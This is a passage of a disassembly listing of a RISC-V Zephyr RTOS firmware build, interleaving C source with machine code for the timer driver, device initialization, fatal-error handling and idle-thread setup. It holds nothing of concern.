8000409e:	ce06                	sw	ra,28(sp)
800040a0:	cc22                	sw	s0,24(sp)
800040a2:	8000c437          	lui	s0,0x8000c
800040a6:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800040aa:	c63e                	sw	a5,12(sp)
800040ac:	4781                	li	a5,0
	ARG_UNUSED(dev);

	IRQ_CONNECT(TIMER_IRQN, 0, timer_isr, NULL, 0);
800040ae:	4601                	li	a2,0
800040b0:	4581                	li	a1,0
800040b2:	451d                	li	a0,7
800040b4:	9b4ff0ef          	jal	ra,80003268 <z_riscv_irq_priority_set>
	last_count = mtime();
800040b8:	375d                	jal	8000405e <mtime>
800040ba:	87aa                	mv	a5,a0
800040bc:	80009737          	lui	a4,0x80009
800040c0:	00a72023          	sw	a0,0(a4) # 80009000 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009001>
800040c4:	00b72223          	sw	a1,4(a4)
	set_mtimecmp(last_count + CYC_PER_TICK);
800040c8:	6561                	lui	a0,0x18
800040ca:	6a050513          	addi	a0,a0,1696 # 186a0 <__rom_region_size+0xf6a0>
800040ce:	953e                	add	a0,a0,a5
800040d0:	00f537b3          	sltu	a5,a0,a5
800040d4:	95be                	add	a1,a1,a5
800040d6:	37a1                	jal	8000401e <set_mtimecmp>
	irq_enable(TIMER_IRQN);
800040d8:	451d                	li	a0,7
800040da:	946ff0ef          	jal	ra,80003220 <arch_irq_enable>
	return 0;
}
800040de:	4732                	lw	a4,12(sp)
800040e0:	95042783          	lw	a5,-1712(s0)
800040e4:	8fb9                	xor	a5,a5,a4
800040e6:	4701                	li	a4,0
800040e8:	e791                	bnez	a5,800040f4 <sys_clock_driver_init+0x58>
800040ea:	4501                	li	a0,0
800040ec:	40f2                	lw	ra,28(sp)
800040ee:	4462                	lw	s0,24(sp)
800040f0:	6105                	addi	sp,sp,32
800040f2:	8082                	ret
800040f4:	3ff010ef          	jal	ra,80005cf2 <_StackCheckHandler>

800040f8 <timer_isr>:
{
800040f8:	7179                	addi	sp,sp,-48
800040fa:	d606                	sw	ra,44(sp)
800040fc:	d422                	sw	s0,40(sp)
800040fe:	d226                	sw	s1,36(sp)
80004100:	d04a                	sw	s2,32(sp)
80004102:	ce4e                	sw	s3,28(sp)
80004104:	cc52                	sw	s4,24(sp)
80004106:	8000ca37          	lui	s4,0x8000c
8000410a:	950a2783          	lw	a5,-1712(s4) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000410e:	c63e                	sw	a5,12(sp)
80004110:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80004112:	300479f3          	csrrci	s3,mstatus,8
	uint64_t now = mtime();
80004116:	37a1                	jal	8000405e <mtime>
80004118:	842a                	mv	s0,a0
8000411a:	892e                	mv	s2,a1
	uint32_t dticks = (uint32_t)((now - last_count) / CYC_PER_TICK);
8000411c:	800094b7          	lui	s1,0x80009
80004120:	0004a503          	lw	a0,0(s1) # 80009000 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009001>
80004124:	0044a783          	lw	a5,4(s1)
80004128:	40a40533          	sub	a0,s0,a0
8000412c:	00a435b3          	sltu	a1,s0,a0
80004130:	40f907b3          	sub	a5,s2,a5
80004134:	6661                	lui	a2,0x18
80004136:	6a060613          	addi	a2,a2,1696 # 186a0 <__rom_region_size+0xf6a0>
8000413a:	4681                	li	a3,0
8000413c:	40b785b3          	sub	a1,a5,a1
80004140:	828fc0ef          	jal	ra,80000168 <__udivdi3>
	last_count = now;
80004144:	0084a023          	sw	s0,0(s1)
80004148:	0124a223          	sw	s2,4(s1)
	__asm__ volatile ("csrs mstatus, %0"
8000414c:	0089f993          	andi	s3,s3,8
80004150:	3009a073          	csrs	mstatus,s3
	sys_clock_announce(IS_ENABLED(CONFIG_TICKLESS_KERNEL) ? dticks : 1);
80004154:	779010ef          	jal	ra,800060cc <sys_clock_announce>
}
80004158:	4732                	lw	a4,12(sp)
8000415a:	950a2783          	lw	a5,-1712(s4)
8000415e:	8fb9                	xor	a5,a5,a4
80004160:	4701                	li	a4,0
80004162:	eb89                	bnez	a5,80004174 <timer_isr+0x7c>
80004164:	50b2                	lw	ra,44(sp)
80004166:	5422                	lw	s0,40(sp)
80004168:	5492                	lw	s1,36(sp)
8000416a:	5902                	lw	s2,32(sp)
8000416c:	49f2                	lw	s3,28(sp)
8000416e:	4a62                	lw	s4,24(sp)
80004170:	6145                	addi	sp,sp,48
80004172:	8082                	ret
80004174:	37f010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004178 <sys_clock_set_timeout>:
{
80004178:	1101                	addi	sp,sp,-32
8000417a:	ce06                	sw	ra,28(sp)
8000417c:	cc22                	sw	s0,24(sp)
8000417e:	ca26                	sw	s1,20(sp)
80004180:	8000c7b7          	lui	a5,0x8000c
80004184:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004188:	c63a                	sw	a4,12(sp)
8000418a:	4701                	li	a4,0
	if (idle) {
8000418c:	e1dd                	bnez	a1,80004232 <sys_clock_set_timeout+0xba>
	ticks = ticks == K_TICKS_FOREVER ? MAX_TICKS : ticks;
8000418e:	57fd                	li	a5,-1
80004190:	04f50863          	beq	a0,a5,800041e0 <sys_clock_set_timeout+0x68>
	ticks = CLAMP(ticks - 1, 0, (int32_t)MAX_TICKS);
80004194:	4785                	li	a5,1
80004196:	04a7d963          	bge	a5,a0,800041e8 <sys_clock_set_timeout+0x70>
8000419a:	6795                	lui	a5,0x5
8000419c:	3e178793          	addi	a5,a5,993 # 53e1 <__kernel_ram_size+0x23b1>
800041a0:	04a7c663          	blt	a5,a0,800041ec <sys_clock_set_timeout+0x74>
800041a4:	fff50413          	addi	s0,a0,-1
	__asm__ volatile ("csrrc %0, mstatus, %1"
800041a8:	300474f3          	csrrci	s1,mstatus,8
	uint64_t now = mtime();
800041ac:	3d4d                	jal	8000405e <mtime>
	uint32_t adj, cyc = ticks * CYC_PER_TICK;
800041ae:	66e1                	lui	a3,0x18
800041b0:	6a068793          	addi	a5,a3,1696 # 186a0 <__rom_region_size+0xf6a0>
800041b4:	02f407b3          	mul	a5,s0,a5
	adj = (uint32_t)(now - last_count) + (CYC_PER_TICK - 1);
800041b8:	80009637          	lui	a2,0x80009
800041bc:	00062703          	lw	a4,0(a2) # 80009000 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009001>
800041c0:	00462583          	lw	a1,4(a2)
800041c4:	40e50633          	sub	a2,a0,a4
800041c8:	69f68693          	addi	a3,a3,1695
800041cc:	9636                	add	a2,a2,a3
	if (cyc <= MAX_CYC - adj) {
800041ce:	800006b7          	lui	a3,0x80000
800041d2:	fff6c693          	not	a3,a3
800041d6:	8e91                	sub	a3,a3,a2
800041d8:	00f6ee63          	bltu	a3,a5,800041f4 <sys_clock_set_timeout+0x7c>
		cyc += adj;
800041dc:	97b2                	add	a5,a5,a2
800041de:	a839                	j	800041fc <sys_clock_set_timeout+0x84>
	ticks = ticks == K_TICKS_FOREVER ? MAX_TICKS : ticks;
800041e0:	6515                	lui	a0,0x5
800041e2:	3e150513          	addi	a0,a0,993 # 53e1 <__kernel_ram_size+0x23b1>
800041e6:	bf55                	j	8000419a <sys_clock_set_timeout+0x22>
	ticks = CLAMP(ticks - 1, 0, (int32_t)MAX_TICKS);
800041e8:	4401                	li	s0,0
800041ea:	bf7d                	j	800041a8 <sys_clock_set_timeout+0x30>
800041ec:	6515                	lui	a0,0x5
800041ee:	3e150413          	addi	s0,a0,993 # 53e1 <__kernel_ram_size+0x23b1>
800041f2:	bf5d                	j	800041a8 <sys_clock_set_timeout+0x30>
		cyc = MAX_CYC;
800041f4:	800007b7          	lui	a5,0x80000
800041f8:	fff7c793          	not	a5,a5
	cyc = (cyc / CYC_PER_TICK) * CYC_PER_TICK;
800041fc:	66e1                	lui	a3,0x18
800041fe:	6a068693          	addi	a3,a3,1696 # 186a0 <__rom_region_size+0xf6a0>
80004202:	02d7d7b3          	divu	a5,a5,a3
80004206:	02d787b3          	mul	a5,a5,a3
	if ((int32_t)(cyc + last_count - now) < MIN_DELAY) {
8000420a:	00f706b3          	add	a3,a4,a5
8000420e:	8e89                	sub	a3,a3,a0
80004210:	06300613          	li	a2,99
80004214:	00d64663          	blt	a2,a3,80004220 <sys_clock_set_timeout+0xa8>
		cyc += CYC_PER_TICK;
80004218:	66e1                	lui	a3,0x18
8000421a:	6a068693          	addi	a3,a3,1696 # 186a0 <__rom_region_size+0xf6a0>
8000421e:	97b6                	add	a5,a5,a3
	set_mtimecmp(cyc + last_count);
80004220:	00e78533          	add	a0,a5,a4
80004224:	00f537b3          	sltu	a5,a0,a5
80004228:	95be                	add	a1,a1,a5
8000422a:	3bd5                	jal	8000401e <set_mtimecmp>
	__asm__ volatile ("csrs mstatus, %0"
8000422c:	88a1                	andi	s1,s1,8
8000422e:	3004a073          	csrs	mstatus,s1
}
80004232:	8000c7b7          	lui	a5,0x8000c
80004236:	4732                	lw	a4,12(sp)
80004238:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000423c:	8fb9                	xor	a5,a5,a4
8000423e:	4701                	li	a4,0
80004240:	e791                	bnez	a5,8000424c <sys_clock_set_timeout+0xd4>
80004242:	40f2                	lw	ra,28(sp)
80004244:	4462                	lw	s0,24(sp)
80004246:	44d2                	lw	s1,20(sp)
80004248:	6105                	addi	sp,sp,32
8000424a:	8082                	ret
8000424c:	2a7010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004250 <sys_clock_elapsed>:
{
80004250:	1101                	addi	sp,sp,-32
80004252:	ce06                	sw	ra,28(sp)
80004254:	cc22                	sw	s0,24(sp)
80004256:	ca26                	sw	s1,20(sp)
80004258:	8000c4b7          	lui	s1,0x8000c
8000425c:	9504a783          	lw	a5,-1712(s1) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004260:	c63e                	sw	a5,12(sp)
80004262:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80004264:	30047473          	csrrci	s0,mstatus,8
	uint32_t ret = ((uint32_t)mtime() - (uint32_t)last_count) / CYC_PER_TICK;
80004268:	3bdd                	jal	8000405e <mtime>
8000426a:	800097b7          	lui	a5,0x80009
8000426e:	0007a783          	lw	a5,0(a5) # 80009000 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009001>
80004272:	8d1d                	sub	a0,a0,a5
80004274:	67e1                	lui	a5,0x18
80004276:	6a078793          	addi	a5,a5,1696 # 186a0 <__rom_region_size+0xf6a0>
8000427a:	02f55533          	divu	a0,a0,a5
	__asm__ volatile ("csrs mstatus, %0"
8000427e:	8821                	andi	s0,s0,8
80004280:	30042073          	csrs	mstatus,s0
}
80004284:	4732                	lw	a4,12(sp)
80004286:	9504a783          	lw	a5,-1712(s1)
8000428a:	8fb9                	xor	a5,a5,a4
8000428c:	4701                	li	a4,0
8000428e:	e791                	bnez	a5,8000429a <sys_clock_elapsed+0x4a>
80004290:	40f2                	lw	ra,28(sp)
80004292:	4462                	lw	s0,24(sp)
80004294:	44d2                	lw	s1,20(sp)
80004296:	6105                	addi	sp,sp,32
80004298:	8082                	ret
8000429a:	259010ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000429e <sys_clock_cycle_get_32>:
{
8000429e:	1101                	addi	sp,sp,-32
800042a0:	ce06                	sw	ra,28(sp)
800042a2:	cc22                	sw	s0,24(sp)
800042a4:	8000c437          	lui	s0,0x8000c
800042a8:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800042ac:	c63e                	sw	a5,12(sp)
800042ae:	4781                	li	a5,0
	return (uint32_t)(mtime() << CONFIG_RISCV_MACHINE_TIMER_SYSTEM_CLOCK_DIVIDER);
800042b0:	337d                	jal	8000405e <mtime>
}
800042b2:	4732                	lw	a4,12(sp)
800042b4:	95042783          	lw	a5,-1712(s0)
800042b8:	8fb9                	xor	a5,a5,a4
800042ba:	4701                	li	a4,0
800042bc:	e789                	bnez	a5,800042c6 <sys_clock_cycle_get_32+0x28>
800042be:	40f2                	lw	ra,28(sp)
800042c0:	4462                	lw	s0,24(sp)
800042c2:	6105                	addi	sp,sp,32
800042c4:	8082                	ret
800042c6:	22d010ef          	jal	ra,80005cf2 <_StackCheckHandler>

800042ca <z_device_state_init>:
 *
 * The state object is always zero-initialized, but this may not be
 * sufficient.
 */
void z_device_state_init(void)
{
800042ca:	1101                	addi	sp,sp,-32
800042cc:	ce06                	sw	ra,28(sp)
800042ce:	8000c7b7          	lui	a5,0x8000c
800042d2:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800042d6:	c63a                	sw	a4,12(sp)
800042d8:	4701                	li	a4,0
	const struct device *dev = __device_start;
800042da:	80007737          	lui	a4,0x80007
800042de:	efc70713          	addi	a4,a4,-260 # 80006efc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80006efd>

	while (dev < __device_end) {
800042e2:	a011                	j	800042e6 <z_device_state_init+0x1c>
		z_object_init(dev);
		++dev;
800042e4:	0761                	addi	a4,a4,24
	while (dev < __device_end) {
800042e6:	800077b7          	lui	a5,0x80007
800042ea:	f1478793          	addi	a5,a5,-236 # 80006f14 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80006f15>
800042ee:	fef76be3          	bltu	a4,a5,800042e4 <z_device_state_init+0x1a>
	}
}
800042f2:	8000c7b7          	lui	a5,0x8000c
800042f6:	4732                	lw	a4,12(sp)
800042f8:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800042fc:	8fb9                	xor	a5,a5,a4
800042fe:	4701                	li	a4,0
80004300:	e781                	bnez	a5,80004308 <z_device_state_init+0x3e>
80004302:	40f2                	lw	ra,28(sp)
80004304:	6105                	addi	sp,sp,32
80004306:	8082                	ret
80004308:	1eb010ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000430c <z_sys_init_run_level>:
 * off and the next one begins.
 *
 * @param level init level to run.
 */
void z_sys_init_run_level(int32_t level)
{
8000430c:	1101                	addi	sp,sp,-32
8000430e:	ce06                	sw	ra,28(sp)
80004310:	cc22                	sw	s0,24(sp)
80004312:	ca26                	sw	s1,20(sp)
80004314:	c84a                	sw	s2,16(sp)
80004316:	892a                	mv	s2,a0
80004318:	8000c7b7          	lui	a5,0x8000c
8000431c:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004320:	c63a                	sw	a4,12(sp)
80004322:	4701                	li	a4,0
		/* End marker */
		__init_end,
	};
	const struct init_entry *entry;

	for (entry = levels[level]; entry < levels[level+1]; entry++) {
80004324:	800087b7          	lui	a5,0x80008
80004328:	00251713          	slli	a4,a0,0x2
8000432c:	08478793          	addi	a5,a5,132 # 80008084 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80008085>
80004330:	97ba                	add	a5,a5,a4
80004332:	4380                	lw	s0,0(a5)
80004334:	a839                	j	80004352 <z_sys_init_run_level+0x46>
			/* Mark device initialized.  If initialization
			 * failed, record the error condition.
			 */
			if (rc != 0) {
				if (rc < 0) {
					rc = -rc;
80004336:	40a00533          	neg	a0,a0
8000433a:	a83d                	j	80004378 <z_sys_init_run_level+0x6c>
				}
				if (rc > UINT8_MAX) {
					rc = UINT8_MAX;
				}
				dev->state->init_res = rc;
8000433c:	44dc                	lw	a5,12(s1)
8000433e:	00a78023          	sb	a0,0(a5)
			}
			dev->state->initialized = true;
80004342:	44d8                	lw	a4,12(s1)
80004344:	00075783          	lhu	a5,0(a4)
80004348:	1007e793          	ori	a5,a5,256
8000434c:	00f71023          	sh	a5,0(a4)
	for (entry = levels[level]; entry < levels[level+1]; entry++) {
80004350:	0421                	addi	s0,s0,8
80004352:	00190713          	addi	a4,s2,1
80004356:	800087b7          	lui	a5,0x80008
8000435a:	070a                	slli	a4,a4,0x2
8000435c:	08478793          	addi	a5,a5,132 # 80008084 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80008085>
80004360:	97ba                	add	a5,a5,a4
80004362:	439c                	lw	a5,0(a5)
80004364:	02f47163          	bgeu	s0,a5,80004386 <z_sys_init_run_level+0x7a>
		const struct device *dev = entry->dev;
80004368:	4044                	lw	s1,4(s0)
		int rc = entry->init(dev);
8000436a:	401c                	lw	a5,0(s0)
8000436c:	8526                	mv	a0,s1
8000436e:	9782                	jalr	a5
		if (dev != NULL) {
80004370:	d0e5                	beqz	s1,80004350 <z_sys_init_run_level+0x44>
			if (rc != 0) {
80004372:	d961                	beqz	a0,80004342 <z_sys_init_run_level+0x36>
				if (rc < 0) {
80004374:	fc0541e3          	bltz	a0,80004336 <z_sys_init_run_level+0x2a>
				if (rc > UINT8_MAX) {
80004378:	0ff00793          	li	a5,255
8000437c:	fca7d0e3          	bge	a5,a0,8000433c <z_sys_init_run_level+0x30>
					rc = UINT8_MAX;
80004380:	0ff00513          	li	a0,255
80004384:	bf65                	j	8000433c <z_sys_init_run_level+0x30>
		}
	}
}
80004386:	8000c7b7          	lui	a5,0x8000c
8000438a:	4732                	lw	a4,12(sp)
8000438c:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004390:	8fb9                	xor	a5,a5,a4
80004392:	4701                	li	a4,0
80004394:	e799                	bnez	a5,800043a2 <z_sys_init_run_level+0x96>
80004396:	40f2                	lw	ra,28(sp)
80004398:	4462                	lw	s0,24(sp)
8000439a:	44d2                	lw	s1,20(sp)
8000439c:	4942                	lw	s2,16(sp)
8000439e:	6105                	addi	sp,sp,32
800043a0:	8082                	ret
800043a2:	151010ef          	jal	ra,80005cf2 <_StackCheckHandler>

800043a6 <z_device_is_ready>:
	*devices = __device_start;
	return __device_end - __device_start;
}

bool z_device_is_ready(const struct device *dev)
{
800043a6:	1101                	addi	sp,sp,-32
800043a8:	ce06                	sw	ra,28(sp)
800043aa:	8000c7b7          	lui	a5,0x8000c
800043ae:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800043b2:	c63a                	sw	a4,12(sp)
800043b4:	4701                	li	a4,0
	/*
	 * if an invalid device pointer is passed as argument, this call
	 * reports the `device` as not ready for usage.
	 */
	if (dev == NULL) {
800043b6:	c505                	beqz	a0,800043de <z_device_is_ready+0x38>
		return false;
	}

	return dev->state->initialized && (dev->state->init_res == 0U);
800043b8:	455c                	lw	a5,12(a0)
800043ba:	4388                	lw	a0,0(a5)
800043bc:	1ff57513          	andi	a0,a0,511
800043c0:	f0050513          	addi	a0,a0,-256
800043c4:	00153513          	seqz	a0,a0
}
800043c8:	8000c7b7          	lui	a5,0x8000c
800043cc:	4732                	lw	a4,12(sp)
800043ce:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800043d2:	8fb9                	xor	a5,a5,a4
800043d4:	4701                	li	a4,0
800043d6:	e791                	bnez	a5,800043e2 <z_device_is_ready+0x3c>
800043d8:	40f2                	lw	ra,28(sp)
800043da:	6105                	addi	sp,sp,32
800043dc:	8082                	ret
		return false;
800043de:	4501                	li	a0,0
800043e0:	b7e5                	j	800043c8 <z_device_is_ready+0x22>
}
800043e2:	111010ef          	jal	ra,80005cf2 <_StackCheckHandler>

800043e6 <arch_system_halt>:

LOG_MODULE_DECLARE(os, CONFIG_KERNEL_LOG_LEVEL);

/* LCOV_EXCL_START */
FUNC_NORETURN __weak void arch_system_halt(unsigned int reason)
{
800043e6:	1141                	addi	sp,sp,-16
800043e8:	8000c7b7          	lui	a5,0x8000c
800043ec:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800043f0:	c63a                	sw	a4,12(sp)
800043f2:	4701                	li	a4,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
800043f4:	300477f3          	csrrci	a5,mstatus,8
	/* TODO: What's the best way to totally halt the system if SMP
	 * is enabled?
	 */

	(void)arch_irq_lock();
	for (;;) {
800043f8:	a001                	j	800043f8 <arch_system_halt+0x12>

800043fa <k_sys_fatal_error_handler>:
/* LCOV_EXCL_STOP */

/* LCOV_EXCL_START */
__weak void k_sys_fatal_error_handler(unsigned int reason,
				      const z_arch_esf_t *esf)
{
800043fa:	1101                	addi	sp,sp,-32
800043fc:	ce06                	sw	ra,28(sp)
800043fe:	8000c7b7          	lui	a5,0x8000c
80004402:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004406:	c63a                	sw	a4,12(sp)
80004408:	4701                	li	a4,0
	ARG_UNUSED(esf);

	LOG_PANIC();
	LOG_ERR("Halting system");
	arch_system_halt(reason);
8000440a:	3ff1                	jal	800043e6 <arch_system_halt>

8000440c <z_fatal_error>:
	return 0;
#endif
}

void z_fatal_error(unsigned int reason, const z_arch_esf_t *esf)
{
8000440c:	1101                	addi	sp,sp,-32
8000440e:	ce06                	sw	ra,28(sp)
80004410:	cc22                	sw	s0,24(sp)
80004412:	ca26                	sw	s1,20(sp)
80004414:	c84a                	sw	s2,16(sp)
80004416:	8000c4b7          	lui	s1,0x8000c
8000441a:	9504a783          	lw	a5,-1712(s1) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000441e:	c63e                	sw	a5,12(sp)
80004420:	4781                	li	a5,0
80004422:	30047473          	csrrci	s0,mstatus,8
80004426:	00022903          	lw	s2,0(tp) # 0 <CONFIG_2ND_LVL_INTR_01_OFFSET>

#ifndef CONFIG_XTENSA
	coredump(reason, esf, thread);
#endif

	k_sys_fatal_error_handler(reason, esf);
8000442a:	3fc1                	jal	800043fa <k_sys_fatal_error_handler>
			  : "r" (key & MSTATUS_IEN)
8000442c:	8821                	andi	s0,s0,8
	__asm__ volatile ("csrs mstatus, %0"
8000442e:	30042073          	csrs	mstatus,s0
	z_impl_k_thread_abort(thread);
80004432:	854a                	mv	a0,s2
80004434:	093010ef          	jal	ra,80005cc6 <z_impl_k_thread_abort>
	arch_irq_unlock(key);

	if (IS_ENABLED(CONFIG_MULTITHREADING)) {
		k_thread_abort(thread);
	}
}
80004438:	4732                	lw	a4,12(sp)
8000443a:	9504a783          	lw	a5,-1712(s1)
8000443e:	8fb9                	xor	a5,a5,a4
80004440:	4701                	li	a4,0
80004442:	e799                	bnez	a5,80004450 <z_fatal_error+0x44>
80004444:	40f2                	lw	ra,28(sp)
80004446:	4462                	lw	s0,24(sp)
80004448:	44d2                	lw	s1,20(sp)
8000444a:	4942                	lw	s2,16(sp)
8000444c:	6105                	addi	sp,sp,32
8000444e:	8082                	ret
80004450:	0a3010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004454 <init_idle_thread>:
} /* LCOV_EXCL_LINE ... because we just dumped final coverage data */

#if defined(CONFIG_MULTITHREADING)
__boot_func
static void init_idle_thread(int i)
{
80004454:	7139                	addi	sp,sp,-64
80004456:	de06                	sw	ra,60(sp)
80004458:	dc22                	sw	s0,56(sp)
8000445a:	da26                	sw	s1,52(sp)
8000445c:	d84a                	sw	s2,48(sp)
8000445e:	d64e                	sw	s3,44(sp)
80004460:	d452                	sw	s4,40(sp)
80004462:	842a                	mv	s0,a0
80004464:	8000ca37          	lui	s4,0x8000c
80004468:	950a2783          	lw	a5,-1712(s4) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000446c:	ce3e                	sw	a5,28(sp)
8000446e:	4781                	li	a5,0
	struct k_thread *thread = &z_idle_threads[i];
80004470:	00351913          	slli	s2,a0,0x3
80004474:	00a909b3          	add	s3,s2,a0
80004478:	0992                	slli	s3,s3,0x4
8000447a:	800094b7          	lui	s1,0x80009
8000447e:	19848493          	addi	s1,s1,408 # 80009198 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009199>
80004482:	99a6                	add	s3,s3,s1
	k_thread_stack_t *stack = z_idle_stacks[i];
80004484:	052a                	slli	a0,a0,0xa
#else
	char *tname = NULL;
#endif /* CONFIG_THREAD_NAME */

	z_setup_new_thread(thread, stack,
			  CONFIG_IDLE_STACK_SIZE, idle, &_kernel.cpus[i],
80004486:	00141693          	slli	a3,s0,0x1
8000448a:	96a2                	add	a3,a3,s0
8000448c:	068e                	slli	a3,a3,0x3
	z_setup_new_thread(thread, stack,
8000448e:	c202                	sw	zero,4(sp)
80004490:	4785                	li	a5,1
80004492:	c03e                	sw	a5,0(sp)
80004494:	48bd                	li	a7,15
80004496:	4801                	li	a6,0
80004498:	4781                	li	a5,0
8000449a:	80009737          	lui	a4,0x80009
8000449e:	52070713          	addi	a4,a4,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800044a2:	9736                	add	a4,a4,a3
800044a4:	800056b7          	lui	a3,0x80005
800044a8:	afc68693          	addi	a3,a3,-1284 # 80004afc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80004afd>
800044ac:	40000613          	li	a2,1024
800044b0:	8000a5b7          	lui	a1,0x8000a
800044b4:	55058593          	addi	a1,a1,1360 # 8000a550 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000a551>
800044b8:	95aa                	add	a1,a1,a0
800044ba:	854e                	mv	a0,s3
800044bc:	2175                	jal	80004968 <z_setup_new_thread>
	SYS_PORT_TRACING_FUNC(k_thread, sched_resume, thread);
}

static inline void z_mark_thread_as_started(struct k_thread *thread)
{
	thread->base.thread_state &= ~_THREAD_PRESTART;
800044be:	00d9c783          	lbu	a5,13(s3)
800044c2:	9bed                	andi	a5,a5,-5
800044c4:	00f986a3          	sb	a5,13(s3)
	z_mark_thread_as_started(thread);

#ifdef CONFIG_SMP
	thread->base.is_idle = 1U;
#endif
}
800044c8:	4772                	lw	a4,28(sp)
800044ca:	950a2783          	lw	a5,-1712(s4)
800044ce:	8fb9                	xor	a5,a5,a4
800044d0:	4701                	li	a4,0
800044d2:	eb89                	bnez	a5,800044e4 <init_idle_thread+0x90>
800044d4:	50f2                	lw	ra,60(sp)
800044d6:	5462                	lw	s0,56(sp)
800044d8:	54d2                	lw	s1,52(sp)
800044da:	5942                	lw	s2,48(sp)
800044dc:	59b2                	lw	s3,44(sp)
800044de:	5a22                	lw	s4,40(sp)
800044e0:	6121                	addi	sp,sp,64
800044e2:	8082                	ret
800044e4:	00f010ef          	jal	ra,80005cf2 <_StackCheckHandler>

800044e8 <bg_thread_main>:
{
800044e8:	1101                	addi	sp,sp,-32
800044ea:	ce06                	sw	ra,28(sp)
800044ec:	cc22                	sw	s0,24(sp)
800044ee:	8000c437          	lui	s0,0x8000c
800044f2:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800044f6:	c63e                	sw	a5,12(sp)
800044f8:	4781                	li	a5,0
	z_sys_post_kernel = true;
800044fa:	800097b7          	lui	a5,0x80009
800044fe:	4705                	li	a4,1
80004500:	06e78023          	sb	a4,96(a5) # 80009060 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009061>
	z_sys_init_run_level(_SYS_INIT_LEVEL_POST_KERNEL);
80004504:	4509                	li	a0,2
80004506:	3519                	jal	8000430c <z_sys_init_run_level>
	boot_banner();
80004508:	4e9010ef          	jal	ra,800061f0 <boot_banner>
	z_sys_init_run_level(_SYS_INIT_LEVEL_APPLICATION);
8000450c:	450d                	li	a0,3
8000450e:	3bfd                	jal	8000430c <z_sys_init_run_level>
	z_init_static_threads();
80004510:	29cd                	jal	80004a02 <z_init_static_threads>
	main();
80004512:	d8dfd0ef          	jal	ra,8000229e <main>
	z_main_thread.base.user_options &= ~K_ESSENTIAL;
80004516:	800097b7          	lui	a5,0x80009
8000451a:	22878793          	addi	a5,a5,552 # 80009228 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009229>
8000451e:	00c7c703          	lbu	a4,12(a5)
80004522:	9b79                	andi	a4,a4,-2
80004524:	00e78623          	sb	a4,12(a5)
} /* LCOV_EXCL_LINE ... because we just dumped final coverage data */
80004528:	4732                	lw	a4,12(sp)
8000452a:	95042783          	lw	a5,-1712(s0)
8000452e:	8fb9                	xor	a5,a5,a4
80004530:	4701                	li	a4,0
80004532:	e789                	bnez	a5,8000453c <bg_thread_main+0x54>
80004534:	40f2                	lw	ra,28(sp)
80004536:	4462                	lw	s0,24(sp)
80004538:	6105                	addi	sp,sp,32
8000453a:	8082                	ret
8000453c:	7b6010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80004540 <z_swap_unlocked>:
{
	return do_swap(key.key, lock, true);
}

static inline void z_swap_unlocked(void)
{
80004540:	1101                	addi	sp,sp,-32
80004542:	ce06                	sw	ra,28(sp)
80004544:	cc22                	sw	s0,24(sp)
80004546:	ca26                	sw	s1,20(sp)
80004548:	c84a                	sw	s2,16(sp)
8000454a:	8000c7b7          	lui	a5,0x8000c
8000454e:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004552:	c63a                	sw	a4,12(sp)
80004554:	4701                	li	a4,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
